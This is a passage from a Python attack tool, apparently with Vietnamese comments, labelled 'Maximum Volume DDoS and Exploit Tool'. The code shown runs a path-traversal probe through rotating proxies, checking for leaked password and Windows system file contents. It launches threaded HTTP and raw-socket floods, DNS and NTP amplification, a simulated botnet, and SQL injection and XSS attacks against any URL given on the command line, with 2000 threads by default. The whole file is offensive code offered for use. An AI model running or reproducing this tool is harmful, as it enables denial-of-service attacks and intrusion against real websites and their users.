                                            self.vuln_queue.put(vuln)
                                except:
                                    pass
                            
                            # Gửi thống kê
                            with self.lock:
                                self.stats_queue.put(("request", 200))
                else:
                    # Test with path parameters
                    for payload in self.exploit_payloads["path_traversal"]:
                        test_url = f"{self.target_url}/?file={payload}"
                        
                        if use_proxy:
                            try:
                                response = session.get(
                                    test_url, 
                                    proxies=proxy_dict, 
                                    verify=False, 
                                    timeout=2,
                                    stream=True
                                )
                                
                                # Check for path traversal
                                if self.check_path_traversal(response):
                                    vuln = {
                                        "type": "Path Traversal",
                                        "url": test_url,
                                        "method": "GET",
                                        "parameter": "file",
                                        "payload": payload,
                                        "evidence": "Path traversal detected"
                                    }
                                    with self.lock:
                                        self.vuln_queue.put(vuln)
                                
                                # Trả proxy về hàng đợi
                                self.proxy_queue.put(proxy)
                            except:
                                # Trả proxy về hàng đợi ngay cả khi có lỗi
                                self.proxy_queue.put(proxy)
                        else:
                            try:
                                response = session.get(
                                    test_url, 
                                    verify=False, 
                                    timeout=2,
                                    stream=True
                                )
                                
                                # Check for path traversal
                                if self.check_path_traversal(response):
                                    vuln = {
                                        "type": "Path Traversal",
                                        "url": test_url,
                                        "method": "GET",
                                        "parameter": "file",
                                        "payload": payload,
                                        "evidence": "Path traversal detected"
                                    }
                                    with self.lock:
                                        self.vuln_queue.put(vuln)
                            except:
                                pass
                        
                        # Gửi thống kê
                        with self.lock:
                            self.stats_queue.put(("request", 200))
                
                # Không có delay để tăng tốc độ tối đa
            except Exception as e:
                with self.lock:
                    self.stats_queue.put(("error", str(e)))
    
    def check_path_traversal(self, response):
        content = response.text.lower()
        
        # Check for file content disclosure
        if "root:" in content or "daemon:" in content or "bin:" in content:
            return True
        
        # Check for Windows file content
        if "for 16-bit app support" in content or "[fonts]" in content or "[extensions]" in content:
            return True
            
        return False
    
    def stats_collector(self):
        start_time = time.time()
        self.results["start_time"] = time.strftime("%Y-%m-%d %H:%M:%S")
        total_amplification = 0
        
        while not self.stop_event.is_set():
            try:
                stat_type, stat_value = self.stats_queue.get(timeout=0.01)
                
                if stat_type == "request":
                    self.results["requests_sent"] += 1
                    if 200 <= stat_value < 300:
                        self.results["successful_requests"] += 1
                    else:
                        self.results["failed_requests"] += 1
                elif stat_type == "error":
                    self.results["requests_sent"] += 1
                    self.results["failed_requests"] += 1
                elif stat_type == "amplification":
                    total_amplification += stat_value
            except queue.Empty:
                pass
            
            # Calculate RPS
            elapsed = time.time() - start_time
            current_rps = self.results["requests_sent"] / elapsed if elapsed > 0 else 0
            self.results["rps"] = current_rps
            
            # Update peak RPS
            if current_rps > self.results["peak_rps"]:
                self.results["peak_rps"] = current_rps
            
            # Print stats every 5 seconds
            if int(time.time()) % 5 == 0:
                print(f"{Fore.CYAN}[*] Requests: {self.results['requests_sent']} | RPS: {current_rps:.2f} | Peak RPS: {self.results['peak_rps']:.2f} | Success: {self.results['successful_requests']} | Failed: {self.results['failed_requests']}")
        
        self.results["end_time"] = time.strftime("%Y-%m-%d %H:%M:%S")
        self.results["amplification_factor"] = total_amplification
    
    def vuln_collector(self):
        while not self.stop_event.is_set():
            try:
                vuln = self.vuln_queue.get(timeout=0.1)
                self.results["vulnerabilities_found"].append(vuln)
                print(f"{Fore.GREEN}[!] Vulnerability found: {vuln['type']} in {vuln['url']}")
            except queue.Empty:
                pass
    
    def run_attack(self, attack_methods, exploit_methods):
        print(f"{Fore.CYAN}[*] Starting maximum volume DDoS and exploit attack on {self.target_url}")
        print(f"{Fore.CYAN}[*] Duration: {self.duration} seconds")
        print(f"{Fore.CYAN}[*] Threads: {self.threads}")
        print(f"{Fore.CYAN}[*] DDoS methods: {', '.join(attack_methods)}")
        print(f"{Fore.CYAN}[*] Exploit methods: {', '.join(exploit_methods)}")
        
        # Add attack methods to results
        self.results["attack_methods"] = attack_methods + exploit_methods
        
        # Start stats collector thread
        stats_thread = threading.Thread(target=self.stats_collector)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Start vulnerability collector thread
        vuln_thread = threading.Thread(target=self.vuln_collector)
        vuln_thread.daemon = True
        vuln_thread.start()
        
        # Start attack threads
        threads = []
        
        # Calculate threads per method
        ddos_threads_per_method = self.threads // (len(attack_methods) + len(exploit_methods))
        
        # Start DDoS attack threads
        for method in attack_methods:
            for i in range(ddos_threads_per_method):
                if method == "ultra_fast_http_flood":
                    t = threading.Thread(target=self.ultra_fast_http_flood)
                elif method == "raw_socket_flood":
                    t = threading.Thread(target=self.raw_socket_flood)
                elif method == "dns_amplification":
                    t = threading.Thread(target=self.dns_amplification_attack)
                elif method == "ntp_amplification":
                    t = threading.Thread(target=self.ntp_amplification_attack)
                elif method == "botnet":
                    t = threading.Thread(target=self.botnet_attack)
                
                t.daemon = True
                t.start()
                threads.append(t)
        
        # Start exploit attack threads
        for method in exploit_methods:
            for i in range(ddos_threads_per_method):
                if method == "sql_injection":
                    t = threading.Thread(target=self.sql_injection_attack)
                elif method == "xss":
                    t = threading.Thread(target=self.xss_attack)
                elif method == "path_traversal":
                    t = threading.Thread(target=self.path_traversal_attack)
                
                t.daemon = True
                t.start()
                threads.append(t)
        
        # Run for specified duration
        time.sleep(self.duration)
        self.stop_event.set()
        
        # Wait for threads to finish
        for t in threads:
            t.join(timeout=1)
        
        # Save results
        if self.output_file:
            with open(self.output_file, "w") as f:
                json.dump(self.results, f, indent=4)
            print(f"{Fore.CYAN}[*] Results saved to {self.output_file}")
        
        print(f"{Fore.CYAN}[*] Attack completed")
        print(f"{Fore.CYAN}[*] Total requests: {self.results['requests_sent']}")
        print(f"{Fore.CYAN}[*] Successful requests: {self.results['successful_requests']}")
        print(f"{Fore.CYAN}[*] Failed requests: {self.results['failed_requests']}")
        print(f"{Fore.CYAN}[*] Average RPS: {self.results['rps']:.2f}")
        print(f"{Fore.CYAN}[*] Peak RPS: {self.results['peak_rps']:.2f}")
        print(f"{Fore.CYAN}[*] Proxies used: {self.results['proxies_used']}")
        print(f"{Fore.CYAN}[*] Botnet nodes: {self.results['botnet_nodes']}")
        print(f"{Fore.CYAN}[*] Amplification factor: {self.results['amplification_factor']}")
        print(f"{Fore.CYAN}[*] Vulnerabilities found: {len(self.results['vulnerabilities_found'])}")
        
        return self.results

def main():
    parser = argparse.ArgumentParser(description="Maximum Volume DDoS and Exploit Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-o", "--output", help="Output file to save results")
    parser.add_argument("-d", "--duration", type=int, default=300, help="Attack duration in seconds (default: 300)")
    parser.add_argument("-t", "--threads", type=int, default=2000, help="Number of threads (default: 2000)")
    parser.add_argument("-p", "--proxy-file", help="File containing proxies (one per line)")
    parser.add_argument("--botnet-nodes", type=int, default=10000, help="Number of botnet nodes to simulate (default: 10000)")
    parser.add_argument("--ddos-methods", nargs="+", default=["ultra_fast_http_flood", "raw_socket_flood"], 
                        choices=["ultra_fast_http_flood", "raw_socket_flood", "dns_amplification", "ntp_amplification", "botnet"],
                        help="DDoS attack methods (default: ultra_fast_http_flood raw_socket_flood)")
    parser.add_argument("--exploit-methods", nargs="+", default=["sql_injection", "xss", "path_traversal"], 
                        choices=["sql_injection", "xss", "path_traversal"],
                        help="Exploit methods (default: sql_injection xss path_traversal)")
    
    args = parser.parse_args()
    
    ddos_tool = MaximumDDoSExploit(
        target_url=args.url,
        output_file=args.output,
        duration=args.duration,
        threads=args.threads,
        proxy_file=args.proxy_file
    )
    
    # Fetch proxies if no proxy file provided
    if not args.proxy_file:
        ddos_tool.fetch_proxies()
    
    # Generate botnet nodes
    if "botnet" in args.ddos_methods:
        ddos_tool.generate_botnet_nodes(args.botnet_nodes)
    
    # Run attack
    ddos_tool.run_attack(args.ddos_methods, args.exploit_methods)

if __name__ == "__main__":
    main()
